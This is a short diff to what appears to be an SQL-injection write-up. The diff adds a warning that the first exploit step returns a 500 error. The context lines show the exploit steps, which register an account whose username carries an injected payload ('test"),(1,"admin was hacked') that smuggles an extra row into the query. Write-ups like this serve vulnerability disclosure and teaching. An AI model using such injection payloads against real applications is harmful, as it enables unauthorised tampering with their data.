@@ -10,6 +10,7 @@ in an SQL query, so that if I create a user with username 'test"),(1,"admin was 
 
 Exploit
 -------
+**WARNING: STEP 1 will generate a 500 error, that's okay, just ignore it**
 1. Register an account with the following data:
    Username: test"),(1,"admin was hacked
    Password: test
